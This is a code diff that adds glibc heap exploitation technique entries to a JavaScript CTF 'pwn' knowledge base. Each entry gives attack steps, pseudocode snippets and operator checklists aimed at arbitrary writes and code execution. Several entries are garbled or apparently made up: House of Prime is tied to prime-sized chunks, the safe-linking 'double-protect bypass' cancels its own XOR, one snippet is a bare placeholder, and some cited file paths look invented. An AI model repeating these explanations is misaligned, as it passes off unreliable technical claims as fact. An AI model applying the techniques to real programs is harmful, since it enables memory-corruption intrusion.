+          'Set up: fill tcache partially (6 entries), create smallbin with corrupted bk',
+          'The fastbin reverse write corrupts smallbin chunk bk to point to strategic address',
+          'Call calloc() to trigger tcache stashing unlink',
+          'Result: arbitrary address written with the value from stage 1',
+          'Final target: __free_hook, _IO_list_all, or similar'
+        ],
+        tools: ['pwndbg bins', 'pwntools', 'one_gadget'],
+        codeSnippet: `House of Atum snippet`,
+        applicableLibc: '2.26-2.31',
+        references: [
+          { description: 'How2Heap: house_of_atum.c', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.36/house_of_atum.c' }
+        ]
+      }
+    ],
+
+    postconditions: {
+      successIndicators: ['Fastbin reverse stage completed', 'Tcache stashing write achieved'],
+      artifacts: ['GDB: fastbin with corrupted fd', 'tcache stashing write visible']
+    },
+
+    operatorChecklist: [
+      '[ ] Verify glibc 2.26-2.31',
+      '[ ] Stage 1: Set up fastbin with corrupted fd',
+      '[ ] Trigger fastbin reverse: malloc returns target_addr',
+      '[ ] At target_addr, write value needed for stage 2',
+      '[ ] Stage 2: Fill tcache partially (6 entries)',
+      '[ ] Create smallbin with corrupted bk (using stage 1 write)',
+      '[ ] Trigger calloc to invoke tcache stashing unlink',
+      '[ ] Verify second arbitrary write occurred',
+      '[ ] Chain to code execution (overwrite hook/FSOP target)'
+    ],
+
+    vulnerabilityTypes: ['heap', 'fastbin', 'tcache', 'combo'],
+    references: [
+      { description: 'How2Heap: house_of_atum.c', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.36/house_of_atum.c' }
+    ]
+  },
+
+  house_of_kiwi: {
+    id: 'house_of_kiwi',
+    name: 'House of Kiwi (Small Bin Corruption + Tcache)',
+    category: 'technique',
+    class: 'house',
+    description: 'Variant of small bin corruption targeting tcache instead of the classic smallbin bk path. House of Kiwi corrupts a smallbin chunk and uses tcache mechanisms (instead of calloc stashing) to trigger the unlink and achieve arbitrary write. The key difference from House of Fun is the specific corruption target and trigger path through tcache rather than classic smallbin unlink.',
+
+    preconditions: {
+      summary: 'Small bin-sized heap overflow or UAF combined with tcache manipulation. Similar to House of Fun but with a different corruption target and trigger mechanism through tcache entry manipulation.',
+      required: [
+        'Heap overflow or UAF on smallbin-sized chunk',
+        'Ability to corrupt smallbin chunk fd/bk pointers',
+        'Glibc 2.26-2.31 (tcache era)',
+        'Ability to manipulate tcache entries to receive the corrupted chunk'
+      ],
+      detectionSteps: [
+        'Verify glibc 2.26-2.31',
+        'Identify smallbin-sized overflow or UAF (chunks 0x80-0x400)',
+        'Check tcache state: need partially filled tcache for the target size',
+        'Plan corruption: smallbin fd/bk → tcache entry manipulation path'
+      ]
+    },
+
+    exploitationPaths: [
+      {
+        name: 'Small Bin Corruption → Tcache Entry Poisoning',
+        description: 'Corrupt smallbin chunk metadata and use tcache manipulation to trigger the unlink for arbitrary write.',
+        steps: [
+          'Allocate chunks A (target smallbin), B (guard)',
+          'Free A to place in smallbin (or unsorted then smallbin after malloc)',
+          'Free B to tcache if small enough',
+          'Corrupt A\'s fd or bk pointer via overflow from B or UAF',
+          'The corruption points to an arbitrary target address (target_addr)',
+          'Set up tcache entries to "receive" the corrupted smallbin chunk',
+          'Manipulate counts so the tcache bin appears to have space',
+          'Trigger via malloc (not calloc — different from House of Fun)',
+          'malloc walks the smallbin and tcache, causing corrupted bk write to target',
+          'Result: arbitrary write of a heap/libc pointer to target_addr'
+        ],
+        tools: ['pwndbg bins', 'pwntools'],
+        codeSnippet: `# House of Kiwi: small bin corruption + tcache
+# Setup smallbin chunk
+a = malloc(0x100)  # smallbin size
+free(a)  # a → smallbin (or unsorted → smallbin)
+
+# Setup tcache for same size
+for i in range(5):
+    p = malloc(0x100)
+    free(p)  # tcache[0x110] has 5 entries
+
+# Corrupt a's bk pointer to point to target
+*(uint64_t*)(a + 0x18) = target_addr - 0x10
+
+# Tcache manipulation: set up to trigger write during malloc
+# The malloc path may check smallbin before tcache
+# When malloc sees smallbin chunk, it may stash remaining chunks
+tcache_struct = heap_base + 0x10
+# Make tcache ready to receive (set count appropriately)
+
+# Trigger: malloc looks at smallbin, finds corrupted chunk
+# Unlink proceeds → target_addr gets written with smallbin head pointer
+p = malloc(0x100)  # triggers smallbin unlink with corrupted bk`,
+        applicableLibc: '2.26-2.31',
+        references: [
+          { description: 'How2Heap: house_of_kiwi.c', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.36/house_of_kiwi.c' }
+        ]
+      }
+    ],
+
+    postconditions: {
+      successIndicators: ['Smallbin unlink write to arbitrary address', 'target_addr corrupted with heap pointer'],
+      artifacts: ['GDB: smallbin with corrupted bk', 'target_addr shows write']
+    },
+
+    operatorChecklist: [
+      '[ ] Verify glibc 2.26-2.31',
+      '[ ] Set up smallbin: allocate and free smallbin-sized chunk',
+      '[ ] Set up tcache: partially fill tcache for same size class',
+      '[ ] Corrupt smallbin chunk bk pointer to target_addr - 0x10 via overflow/UAF',
+      '[ ] Manipulate tcache count/entries to prepare for stash',
+      '[ ] Trigger via malloc (not calloc — distinct from House of Fun)',
+      '[ ] Verify arbitrary write to target_addr',
+      '[ ] Chain with second-stage technique'
+    ],
+
+    vulnerabilityTypes: ['heap', 'smallbin', 'tcache', 'variant'],
+    references: [
+      { description: 'How2Heap: house_of_kiwi.c', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.36/house_of_kiwi.c' }
+    ]
+  },
+
+  house_of_card: {
+    id: 'house_of_card',
+    name: 'House of Card (Double Free via Tcache Key Bypass)',
+    category: 'technique',
+    class: 'house',
+    description: 'Exploits tcache double-free detection bypass to achieve double-free on the same chunk. The tcache stores a "key" pointer in freed chunks to detect double-frees. House of Card bypasses this by overwriting the key field, allowing the same chunk to be freed twice to tcache, enabling classic double-free exploitation (tcache poisoning/duplicate).',
+
+    preconditions: {
+      summary: 'A write primitive that can overwrite the key field of a tcache chunk. By clearing or redirecting the key, the double-free check is bypassed, allowing the same chunk to be returned by malloc twice.',
+      required: [
+        'UAF or write primitive that can reach the key field of a tcache chunk',
+        'The key field is at offset 0x8 in tcache chunks (for 64-bit): tcache_entry->key = pointer to tcache_perthread_struct',
+        'Glibc 2.26-2.31 (tcache key era — later versions may have additional checks)',
+        'Ability to first free a chunk, then overwrite its key, then free again'
+      ],
+      detectionSteps: [
+        'Allocate a tcache-sized chunk',
+        'Free it: observe key field at chunk+0x8 is set to tcache_perthread_struct',
+        'Use UAF/write to overwrite the key field to NULL or another value',
+        'Free the same chunk again: if key was overwritten, double-free check is bypassed',
+        'In GDB: verify chunk appears in tcache twice after second free'
+      ]
+    },
+
+    exploitationPaths: [
+      {
+        name: 'Tcache Key Overwrite → Double Free Enabled',
+        description: 'Overwrite tcache chunk key field to bypass double-free detection, enabling tcache poisoning via double-free.',
+        steps: [
+          'Allocate chunk A (tcache size, e.g., 0x70)',
+          'Free A: A goes to tcache, key field at A+0x8 is set to tcache_perthread_struct',
+          'Use UAF or overflow to overwrite A\'s key field at offset 0x8',
+          'Set key to NULL or any value != tcache_perthread_struct',
+          'Now free A again: tcache checks key == tcache_perthread_struct? NO (overwritten)',
+          'Double-free is NOT detected! A is added to tcache again',
+          'tcache now has A listed twice (or A points to itself)',
+          'Allocate twice: malloc returns A twice — two pointers to same memory',
+          'Use the double allocation for tcache poisoning: overwrite A\'s fd to point to target',
+          'Third malloc returns target — arbitrary allocation achieved'
+        ],
+        tools: ['pwndbg heap', 'pwntools'],
+        codeSnippet: `# House of Card: double free via tcache key bypass
+p = malloc(0x70)  # tcache size
+free(p)  # p → tcache, p->key = tcache_perthread_struct
+
+# UAF/overflow to overwrite p's key field
+# key is at offset 0x8 in the tcache chunk header
+*(uint64_t*)(p + 0x8) = 0  # set key to NULL
+
+# Now free again — tcache double-free check is bypassed!
+free(p)  # p → tcache again! No detection!
+
+# tcache now has p twice (circular: p->next = p)
+# Allocate twice to get p twice
+a1 = malloc(0x70)  # a1 == p
+a2 = malloc(0x70)  # a2 == p (same as a1!)
+
+# Now we have two pointers to the same chunk
+# Use for tcache poisoning:
+# Overwrite via a1
+*(uint64_t*)(a1) = target_addr - 0x10  # fd pointer
+
+# Next allocation returns target_addr
+a3 = malloc(0x70)  # a3 == target_addr!`,
+        applicableLibc: '2.26-2.31',
+        references: [
+          { description: 'How2Heap: house_of_card.c', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.36/house_of_card.c' }
+        ]
+      }
+    ],
+
+    postconditions: {
+      successIndicators: ['Double-free bypassed via key overwrite', 'Same chunk returned twice by malloc', 'Tcache poisoning via double allocation achieved'],
+      artifacts: ['GDB: tcache shows same chunk twice', 'Arbitrary allocation via fd corruption']
+    },
+
+    operatorChecklist: [
+      '[ ] Allocate tcache-sized chunk A',
+      '[ ] Free A to tcache (key field set to tcache_perthread_struct)',
+      '[ ] Overwrite A\'s key field at offset 0x8 to NULL or other value',
+      '[ ] Free A again — double-free bypass confirmed in GDB',
+      '[ ] Allocate twice: get the same chunk twice',
+      '[ ] Use double-pointer to corrupt fd for tcache poisoning',
+      '[ ] Allocate third time: arbitrary address returned',
+      '[ ] Chain to code execution (hook overwrite, FSOP, etc.)'
+    ],
+
+    vulnerabilityTypes: ['heap', 'tcache', 'double-free', 'key-bypass'],
+    references: [
+      { description: 'How2Heap: house_of_card.c', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.36/house_of_card.c' }
+    ]
+  },
+
   // ============== PREREQUISITES ==============
 
   memory_layout: {
@@ -5611,10 +6488,418 @@ p.sendline(b'B' * size)  # fills freed slot with our data
       '[ ] If leak: parse leaked values and build exploit',
       '[ ] If UAF: exploit the race window between signal and return',
     ],
-    vulnerabilityTypes: ['signal-handler', 'race-condition', 'info-leak', 'uaf'],
+vulnerabilityTypes: ['signal-handler', 'race-condition', 'info-leak', 'uaf'],
     references: [
       { description: 'Signal Handler Exploitation in CTF' },
     ],
   },
+
+  safe_linking_bypass: {
+    id: 'safe_linking_bypass',
+    name: 'Safe-Linking Bypass (Prerequisite)',
+    category: 'technique',
+    class: 'heap-prerequisite',
+    description: 'Pre-requisite bypass for modern heap exploitation. Glibc 2.32+ introduced safe-linking which XORs fd pointers with (chunk_addr >> 12). This technique documents the various ways to bypass or work around this protection as a prerequisite for tcache/fastbin exploitation.',
+    preconditions: {
+      summary: 'Understanding of safe-linking and ability to either decrypt existing pointers or bypass the protection entirely.',
+      required: [
+        'Glibc >= 2.32 (safe-linking era)',
+        'Either: heap leak to decrypt existing pointers',
+        'Or: ability to write fd twice (double-protect bypass)',
+        'Understanding of XOR mechanics for pointer corruption'
+      ],
+      detectionSteps: [
+        'Check glibc version: ldd --version',
+        'Identify if safe-linking is present (heap layout shows XORed pointers)',
+        'For decryption: leak poisoned fd + chunk address',
+        'For bypass: write fd twice with different XOR values'
+      ]
+    },
+    exploitationPaths: [
+      {
+        name: 'Decrypt Existing Safe-Linked Pointers',
+        description: 'Recover actual fd pointers from poisoned values using heap leak.',
+        steps: [
+          'Leak poisoned fd pointer: shows XORed value',
+          'Leak or calculate chunk address: chunk_addr',
+          'Decrypt: actual_fd = poisoned_fd ^ (chunk_addr >> 12)',
+          'Use decrypted fd to understand heap layout',
+          'For corruption: encrypt target = target_addr ^ (chunk_addr >> 12)'
+        ],
+        tools: ['pwndbg bins', 'pwntools'],
+        codeSnippet: `# Decrypt safe-linking
+poisoned_fd = leak_from_heap(chunk + 0x10)
+chunk_addr = calculate_from_leak()
+actual_fd = poisoned_fd ^ (chunk_addr >> 12)
+
+# Corrupt: encrypt target
+target_enc = target_addr ^ (chunk_addr >> 12)
+*(uint64_t*)(chunk + 0x10) = target_enc`,
+        applicableLibc: '>= 2.32'
+      },
+      {
+        name: 'Double-Protect Bypass (Leakless)',
+        description: 'Bypass safe-linking by writing the fd pointer twice with different XOR values, canceling out the protection.',
+        steps: [
+          'First write: fd = target1 ^ (chunk_addr >> 12)',
+          'Second write: fd = (target1 ^ (chunk_addr >> 12)) ^ (chunk_addr >> 12)',
+          'Result: fd = target1 after double XOR',
+          'The second write uses the already-XORed value as input',
+          'Effectively bypasses safe-linking without any leak'
+        ],
+        tools: ['pwndbg heap', 'pwntools'],
+        codeSnippet: `# Double-protect bypass
+# First write: XOR with chunk_addr >> 12
+*(uint64_t*)(chunk + 0x10) = target1 ^ (chunk_addr >> 12)
+
+# Second write: XOR the already-XORed value again
+# Result after second XOR: (target1 ^ x) ^ x = target1
+*(uint64_t*)(chunk + 0x10) = (target1 ^ (chunk_addr >> 12)) ^ (chunk_addr >> 12)`,
+        applicableLibc: '>= 2.32',
+        references: [
+          { description: 'How2Heap: safe_link_double_protect', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.36/safe_link_double_protect.c' }
+        ]
+      }
+    ],
+    postconditions: {
+      successIndicators: ['Safe-linking XOR understood and bypassed', 'Pointers can be corrupted without leaking actual addresses'],
+      artifacts: ['GDB: corrupted fd leads to arbitrary allocation']
+    },
+    operatorChecklist: [
+      '[ ] Identify glibc version (2.32+ has safe-linking)',
+      '[ ] For decryption: leak both poisoned fd AND chunk address',
+      '[ ] Calculate: actual = poisoned ^ (addr >> 12)',
+      '[ ] For double-protect: write fd twice with sequential XORs',
+      '[ ] Verify pointer corruption achieves desired tcache/fastbin manipulation'
+    ],
+    vulnerabilityTypes: ['heap', 'tcache', 'fastbin', 'safe-linking', 'prerequisite'],
+    references: [
+      { description: 'Safe-linking paper', url: 'https://research.ptsecurity.com/understanding-glibc-heap-implementation' },
+      { description: 'How2Heap: decrypt_safe_linking', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.35/decrypt_safe_linking.c' }
+    ]
+  },
+
+  large_bin_attack_modern: {
+    id: 'large_bin_attack_modern',
+    name: 'Large Bin Attack (Modern - glibc 2.30+)',
+    category: 'technique',
+    class: 'heap-primitive',
+    description: 'Standalone arbitrary write primitive via large bin corruption. Modern glibc 2.30+ revised the large bin handling but the attack remains effective. By corrupting fd_nextsize/bk_nextsize of a large bin chunk, an arbitrary 64-bit value can be written to a target address during the unlink operation.',
+    preconditions: {
+      summary: 'A heap overflow or UAF allowing corruption of a large bin chunk\'s metadata. Requires ability to allocate large chunks (>= 0x400) and trigger malloc to consolidate.',
+      required: [
+        'Heap overflow or UAF to corrupt large bin chunk',
+        'Ability to place chunk in large bin (size >= 0x400)',
+        'Target address must have a valid pointer for fd check',
+        'Glibc 2.30+ (revised but still vulnerable)'
+      ],
+      detectionSteps: [
+        'Allocate chunks A (large), B (large), C (guard)',
+        'Free A and B to large bin',
+        'Corrupt B\'s fd_nextsize/bk_nextsize to point to target-0x20/target-0x10',
+        'Allocate from large bin to trigger unlink',
+        'Arbitrary write occurs at target address'
+      ]
+    },
+    exploitationPaths: [
+      {
+        name: 'Large Bin -> Arbitrary Write via Unlink',
+        description: 'Corrupt large bin chunk pointers to write arbitrary value during unlink.',
+        steps: [
+          'Allocate A (large, >= 0x400) and B (same size)',
+          'Free A to large bin',
+          'Corrupt B\'s fd_nextsize = target - 0x20',
+          'Corrupt B\'s bk_nextsize = target - 0x10',
+          'Free another chunk to trigger consolidation or malloc to process large bin',
+          'Unlink of B writes &B to target-0x20 (via fd_nextsize)',
+          'Unlink writes &B to target-0x10 (via bk_nextsize) = arbitrary write'
+        ],
+        tools: ['pwndbg heap', 'pwntools'],
+        codeSnippet: `# Large bin attack setup
+a = malloc(0x500)  # large chunk A
+b = malloc(0x500)  # large chunk B
+c = malloc(0x100)  # guard
+
+free(a)  # A into large bin
+
+# Corrupt B's nextsize pointers
+# Target: _IO_list_all - 0x20 (common target for FSOP)
+*(uint64_t*)(b + 0x20) = target_addr - 0x20  # fd_nextsize
+*(uint64_t*)(b + 0x28) = target_addr - 0x10  # bk_nextsize
+
+# Ensure target has valid fd for integrity check
+*(uint64_t*)(target_addr - 0x20) = valid_heap_addr  # pass the checks
+
+# Trigger unlink from large bin
+malloc(0x500)  # unlink B → write &B to target_addr`,
+        applicableLibc: '>= 2.30 (still vulnerable after 2.29 patches)',
+        references: [
+          { description: 'How2Heap: large_bin_attack', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.35/large_bin_attack.c' }
+        ]
+      }
+    ],
+    postconditions: {
+      successIndicators: ['Large bin unlink writes heap pointer to arbitrary address', 'Can be chained with FSOP or other techniques'],
+      artifacts: ['GDB: large bin with corrupted nextsize pointers']
+    },
+    operatorChecklist: [
+      '[ ] Allocate large chunks (>= 0x400) for large bin',
+      '[ ] Free first chunk to populate large bin',
+      '[ ] Corrupt second chunk\'s fd_nextsize/bk_nextsize',
+      '[ ] Place valid pointer at target-0x20 for integrity check',
+      '[ ] Trigger malloc to process large bin and unlink corrupted chunk'
+    ],
+    vulnerabilityTypes: ['heap', 'large-bin', 'arbitrary-write'],
+    references: [
+      { description: 'Large bin attack on CTF Wiki', url: 'https://ctf-wiki.mahaloz.re/pwn/linux/glibc-heap/large_bin_attack/' }
+    ]
+  },
+
+  unsorted_bin_attack_classic: {
+    id: 'unsorted_bin_attack_classic',
+    name: 'Unsorted Bin Attack (Classic - pre-2.29)',
+    category: 'technique',
+    class: 'heap-primitive',
+    description: 'Classic arbitrary write via unsorted bin corruption. Pre-glibc 2.29, the unsorted bin unlink did not check bk->fd == victim, allowing arbitrary write of the bin\'s head pointer to a target address. Mostly patched in modern glibc but appears in CTF challenges with older binaries.',
+    preconditions: {
+      summary: 'A freed chunk in the unsorted bin with ability to corrupt its bk pointer. Requires libc leak for modern versions, but in pre-2.29 the attack itself provides information leak.',
+      required: [
+        'Freed chunk sitting in unsorted bin',
+        'Overflow or UAF to corrupt bk pointer',
+        'Target address must be writable',
+        'For pre-2.29: no integrity check on bk->fd'
+      ],
+      detectionSteps: [
+        'Allocate and free chunk to unsorted bin',
+        'Corrupt chunk->bk = target_addr - 0x10',
+        'Allocate same size to trigger unlink',
+        'bk pointer written to target_addr'
+      ]
+    },
+    exploitationPaths: [
+      {
+        name: 'Unsorted Bin -> Write bk to Target',
+        description: 'Classic unsorted bin attack writes bin head pointer to arbitrary location.',
+        steps: [
+          'malloc chunk and free to unsorted bin',
+          'Corrupt chunk->bk = target - 0x10',
+          'For modern glibc: ensure target-0x10 has valid fd pointer',
+          'malloc(size) triggers unlink',
+          'victim->bk->fd = victim results in write to target-0x10+0x18 = target'
+        ],
+        tools: ['pwndbg heap', 'pwntools'],
+        codeSnippet: `# Unsorted bin attack
+a = malloc(0x80)
+free(a)  # a goes to unsorted bin
+
+# Corrupt bk pointer
+*(uint64_t*)(a + 0x18) = target_addr - 0x10
+
+# For glibc < 2.29: unlink writes &a to target
+# For >= 2.29: need valid pointer at target-0x10
+*(uint64_t*)(target_addr - 0x10) = 0  # or any valid pointer
+
+malloc(0x80)  # trigger unlink → write to target_addr`,
+        applicableLibc: 'Pre-2.29 (classic), >= 2.29 with additional constraints',
+        references: [
+          { description: 'Unsorted Bin Attack on CTF Wiki', url: 'https://ctf-wiki.mahaloz.re/pwn/linux/glibc-heap/unsorted_bin_attack/' }
+        ]
+      }
+    ],
+    postconditions: {
+      successIndicators: ['Unsorted bin unlink writes to target address', 'Often used to overwrite _IO_list_all for FSOP'],
+      artifacts: ['GDB: corrupted bk pointer in unsorted bin chunk']
+    },
+    operatorChecklist: [
+      '[ ] Get chunk into unsorted bin via malloc + free',
+      '[ ] Corrupt chunk->bk to point to target-0x10',
+      '[ ] For modern glibc: place valid fd at target-0x10',
+      '[ ] Trigger malloc to unlink from unsorted bin'
+    ],
+    vulnerabilityTypes: ['heap', 'unsorted-bin', 'arbitrary-write', 'legacy'],
+    references: [
+      { description: 'Understanding glibc heap', url: 'https://research.ptsecurity.com/understanding-glibc-heap-implementation' }
+    ]
+  },
+
+  house_of_prime: {
+    id: 'house_of_prime',
+    name: 'House of Prime',
+    category: 'technique',
+    class: 'house',
+    description: 'Variant of unsorted bin attack that targets the free list manipulation. House of Prime relies on specific malloc behavior with prime-sized allocations to trigger unusual free list operations that can be exploited for arbitrary write.',
+    preconditions: {
+      summary: 'Ability to allocate prime-sized chunks and trigger specific free patterns that interact with the unsorted bin in unusual ways.',
+      required: [
+        'Ability to allocate chunks of specific sizes (often prime numbers)',
+        'Understanding of how prime sizes affect bin indexing',
+        'Control over malloc/free patterns to trigger unusual behavior'
+      ],
+      detectionSteps: [
+        'Identify prime-sized allocations in binary',
+        'Observe how free handles these chunks',
+        'Look for non-standard bin behavior with prime sizes'
+      ]
+    },
+    exploitationPaths: [
+      {
+        name: 'Prime-Size Chunk -> Unsorted Bin Exploitation',
+        description: 'Use prime-sized allocations to manipulate bin behavior.',
+        steps: [
+          'Allocate prime-sized chunk(s)',
+          'Trigger specific free pattern that exposes bin manipulation',
+          'Corrupt bin metadata to achieve write primitive'
+        ],
+        tools: ['pwndbg heap', 'pwntools'],
+        codeSnippet: `# House of Prime concept
+# Allocate prime-sized chunks to manipulate bin behavior
+# The specific exploitation depends on bin index calculation
+# with prime-sized allocations
+
+p = malloc(0x3d)  # example prime size
+free(p)  # unusual bin behavior may be triggered`,
+        applicableLibc: 'Varies by prime size handling',
+        references: [
+          { description: 'How2Heap: house_of_prime', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.23/house_of_prime.c' }
+        ]
+      }
+    ],
+    vulnerabilityTypes: ['heap', 'house', 'bin-manipulation'],
+    references: [
+      { description: 'House of Prime original writeup' }
+    ]
+  },
+
+  house_of_rust: {
+    id: 'house_of_rust',
+    name: 'House of Rust (Modern glibc 2.34+)',
+    category: 'technique',
+    class: 'house',
+    description: 'Modern heap exploitation technique for glibc 2.34+ where traditional hooks (__free_hook, __malloc_hook) are removed. Exploits tcache metadata manipulation and thread-local storage structures to achieve code execution. Still niche and evolving technique.',
+    preconditions: {
+      summary: 'Modern glibc 2.34+ with hooks removed. Requires deeper understanding of allocator internals and alternative targets.',
+      required: [
+        'Glibc >= 2.34 (hooks removed)',
+        'Heap overflow or UAF reaching tcache metadata',
+        'Understanding of thread-local structures as targets',
+        'Alternative execution redirection (not via hooks)'
+      ],
+      detectionSteps: [
+        'Verify glibc 2.34+ in use',
+        'Identify tcache_perthread_struct location',
+        'Explore alternative targets: exit handlers, thread-local, vtables'
+      ]
+    },
+    exploitationPaths: [
+      {
+        name: 'Tcache Metadata -> Thread-Local Corrupt',
+        description: 'Corrupt tcache metadata to redirect execution through thread-local structures.',
+        steps: [
+          'Locate tcache_perthread_struct',
+          'Identify thread-local destructor list or similar',
+          'Corrupt entries to point to controlled memory',
+          'Trigger deallocation to redirect execution'
+        ],
+        tools: ['pwndbg heap', 'pwntools', 'one_gadget'],
+        codeSnippet: `# House of Rust: tcache metadata manipulation
+# Modern glibc 2.34+ doesn't have __free_hook
+
+# Option: corrupt tcache entries to point to thread-local
+tcache_struct = heap_base + 0x10
+
+# Overwrite entry for target size
+# Point to our controlled memory with gadget address
+*(uint64_t*)(tcache_struct + 0x40 + size_index * 8) = controlled_addr
+
+# Place one_gadget or ROP chain at controlled_addr
+# Trigger will follow pointer during tcache processing`,
+        applicableLibc: '>= 2.34',
+        references: [
+          { description: 'House of Rust research', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.36/house_of_rust.c' }
+        ]
+      }
+    ],
+    postconditions: {
+      successIndicators: ['Execution redirected via thread-local or tcache structures'],
+      artifacts: ['GDB: corrupted tcache metadata']
+    },
+    operatorChecklist: [
+      '[ ] Verify glibc 2.34+ (hooks removed)',
+      '[ ] Identify alternative target (thread-local, exit hooks)',
+      '[ ] Corrupt tcache metadata to point to target',
+      '[ ] Place gadget/ROP at controlled address',
+      '[ ] Trigger deallocation'
+    ],
+    vulnerabilityTypes: ['heap', 'tcache', 'modern-glibc', 'leakless'],
+    references: [
+      { description: 'How2Heap: house_of_rust', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.36/house_of_rust.c' }
+    ]
+  },
+
+  house_of_mind_original: {
+    id: 'house_of_mind_original',
+    name: 'House of Mind (Original - Non-Main Arena)',
+    category: 'technique',
+    class: 'house',
+    description: 'Original House of Mind variant that exploits non-main arena thread cache behavior. Different from the fastbin variant - targets thread arenas and uses narrow address proof manipulation to trick malloc into treating arbitrary memory regions as heap chunks. Exploits the fact that thread arenas use mmap rather than brk for large allocations.',
+    preconditions: {
+      summary: 'Understanding of thread arena behavior and ability to control allocation sizes that trigger mmap instead of brk.',
+      required: [
+        'Ability to allocate chunks large enough for mmap (>= 0x20000)',
+        'Understanding of thread arena vs main arena behavior',
+        'Ability to manipulate chunk size to pass arena checks'
+      ],
+      detectionSteps: [
+        'Identify thread arena usage (multiple threads)',
+        'Allocate mmap-sized chunks',
+        'Observe arena assignment behavior',
+        'Corrupt arena pointers to trick malloc'
+      ]
+    },
+    exploitationPaths: [
+      {
+        name: 'Thread Arena -> Fake Chunk via Mmap',
+        description: 'Use mmap behavior in thread arenas to create fake chunks.',
+        steps: [
+          'Allocate mmap-sized chunks to enter thread arena',
+          'Corrupt chunk metadata for arena pointer manipulation',
+          'Trigger malloc to process fake chunk in manipulated arena',
+          'Unlink/write primitives activated'
+        ],
+        tools: ['pwndbg heap', 'pwntools'],
+        codeSnippet: `# House of Mind (Original): thread arena exploitation
+# Thread arenas use mmap for large allocations
+# This enables different chunk manipulation
+
+# Allocate large chunk to enter thread arena
+p = malloc(0x20000)  # triggers mmap → thread arena
+
+# For thread arenas, chunk metadata includes arena pointer
+# Corrupt to point to fake arena or manipulated region
+*(uint64_t*)(p + arena_offset) = fake_arena_addr
+
+# Continue with unlink/write primitives`,
+        applicableLibc: '2.23-2.27 (before tcache stashing changes)',
+        references: [
+          { description: 'House of Mind original writeup' }
+        ]
+      }
+    ],
+    postconditions: {
+      successIndicators: ['Chunk processed in manipulated thread arena'],
+      artifacts: ['GDB: thread arena with corrupted pointers']
+    },
+    operatorChecklist: [
+      '[ ] Identify thread arena usage in binary',
+      '[ ] Allocate mmap-sized chunks to enter thread arena',
+      '[ ] Corrupt arena pointers in chunk metadata',
+      '[ ] Trigger malloc to process in manipulated arena'
+    ],
+    vulnerabilityTypes: ['heap', 'house', 'thread-arena'],
+    references: [
+      { description: 'Heap Exploitation: House of Mind' }
+    ]
+  }
 };
+
 export const TECHNIQUES_LIST = Object.values(PWN_KNOWLEDGE_BASE);
